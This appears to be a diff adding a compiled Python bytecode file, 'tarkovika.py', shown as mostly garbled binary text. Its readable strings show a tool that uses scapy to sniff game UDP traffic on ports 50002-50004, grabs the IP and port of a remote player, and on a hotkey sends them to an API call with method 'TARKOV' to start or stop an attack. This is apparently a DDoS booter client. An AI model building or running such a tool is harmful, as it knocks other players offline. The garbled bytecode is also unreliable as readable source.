@@ -1,0 +1,46 @@
+a
+
+    3|Áa  ã                   @   s(  d dl T d dlmZmZ d dlmZ d dlmZ d dlmZ d dlZd dl	Z	d dl
+Z
+d dlZd dlZd dl
+Z
+d dlZdadad ad	ad
+ZdZdad adadadae
+jdg d
+¢d e
+jdd„ ƒZdd„ Ze
+jdd„ ƒZe
+jdd„ ƒZe
+jd"dd„ƒZ dd„ Z!dd„ Z"dd„ Z#dd „ Z$e%d!kr$e$ƒ  dS )#é    )Ú*)ÚKeyÚListener)Úpprint)Údatetime)ÚProcessNz'http://127.0.0.1/api/v1/tarkov?key=1337z0.0.0.0FÚyÚuZgui)z.htmlz.jsz.ico)Zallowed_extensionsc                 C   s^   | t  jdd… }| t  j}| t j}|dkrZ|tkrZ|a|at ||¡ td 	||¡ƒ d S )Nr   é   z192.168z New IP address detected: {0}:{1})
+ZIPZdstZUDPZdportÚ	currentIPÚcurrentPortÚeelÚsetCurrentIPÚprintÚformat)ÚdataZlocalÚipÚport© r   útarkovika.pyr      s    
+
+r   c                 C   sl   |dkr| a |ad}nd}t d tt t|¡¡}t |j¡}|d dkrXt	|d ƒ dS t	|d ƒ dS d S )	NÚstartZTARKOVZSTOPz {0}&host={1}&port={2}&method={3}ZsuccessTÚmessageF)
+ÚcurrentAttackingIPÚcurrentAttackingPortÚrequestsÚgetr   ÚapiUrlÚjsonÚloadsÚtextr   )r   r   ÚactionÚmethodÚhandler   r   r   ÚhandleAttack*   s    r#   c                 C   sŽ   t | dƒrŠ| jtkrxtrHtttdƒ}|dkrvdat d¡ t	 
+dd¡ qŠtttdƒ}|dkrŠdat d¡ t	 
+dd¡ n| jt
+krŠtdƒ d S )	NÚcharÚstopTFé   iô  r   é   )Úhasattrr$   Ú	attackKeyÚisAttackingr#   r   r   r
+   Ú	setStatusÚwinsoundZBeepr   r   ÚsniffKeyÚ
+startSniffing)ÚkeyZresponser   r   r   Úon_press>   s    
+
+
+
+
+r0   c                 C   sB   | t jkr>tttdƒ tttdƒ t d¡ t	dƒ t
+ƒ  dS d S )Nr%   r&   z1User forced to stop atacks and close application.F)r   Zescr#   r   r   r   r   r
+   r+   r   Ú
+supervisor)r/   r   r   r   Ú
+on_releaseR   s    
+
+r2   c                 C   s(   | st dƒ nt dƒ tdtdd d S )NzSniffing startedzRe-sniffing startedzudp and portrange 50002-50004é   )ÚfilterZstop_filterÚcount)r   Zsniffr   )Úuserr   r   r   r.   _   s    
+r.   c                   C   s0   t  ¡  t d¡ t ¡  t d¡ t ¡  d S )Ng333333Ó?)Úthread1ÚkillÚtimeÚsleepÚthread2Úthread3r   r   r   r   r1   i   s
+    
+
+r1   c                  C   s8   t ttd} |  ¡  W d   ƒ n1 s*0    Y  d S )N)r0   r2   )r   r0   r2   Újoin)Zlistenerr   r   r   ÚstartListeningr   s    r>   c                   C   s   t jddd d S )Nzgui.html)i,  éÈ   )Úsize)r
+   r   r   r   r   r   ÚstartGuiu   s    rA   c                   C   s6   t dƒ ttd ¡ attd ¡ attd ¡ ad S )Nz[THREAD] Starting threads)Útarget)	r   r   rA   r   r7   r.   r;   r>   r<   r   r   r   r   Ú
+threadedStartx   s    rC   Ú__main__)F)&Z	scapy.allZpynput.keyboardr   r   r   r   Zmultiprocessingr   Ú	functoolsr   r,   r   r9   r
+   Zrandomr   r   r   r*   r)   r-   r   r   r7   r;   r<   ÚinitZexposer   r#   r0   r2   r.   r1   r>   rA   rC   Ú__name__r   r   r   r   Ú<module>   sL   
+
+
+
+		
+
